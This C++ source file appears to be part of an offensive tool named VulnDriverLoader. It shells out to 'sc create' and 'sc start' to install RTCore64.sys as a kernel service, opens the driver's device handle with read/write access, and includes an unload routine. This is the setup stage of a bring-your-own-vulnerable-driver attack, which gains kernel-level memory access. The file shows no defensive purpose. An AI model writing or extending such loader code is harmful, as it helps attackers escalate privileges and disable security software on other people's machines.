#include "VulnDriverLoader.h"
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>

BOOL LoadDriver(const std::wstring& driverPath) {
    // system("sc create RTCore64 binPath= \"C:\\path\\to\\RTCore64.sys\" type= kernel start= demand");
    std::wstring cmd = L"sc create RTCore64 binPath= \"" + driverPath + L"\" type= kernel start= demand";
    _wsystem(cmd.c_str());
    _wsystem(L"sc start RTCore64");
    return TRUE;
}

BOOL UnloadDriver() {
    _wsystem(L"sc stop RTCore64");
    _wsystem(L"sc delete RTCore64");
    return TRUE;
}

HANDLE OpenRTCoreDevice() {
    return CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
}
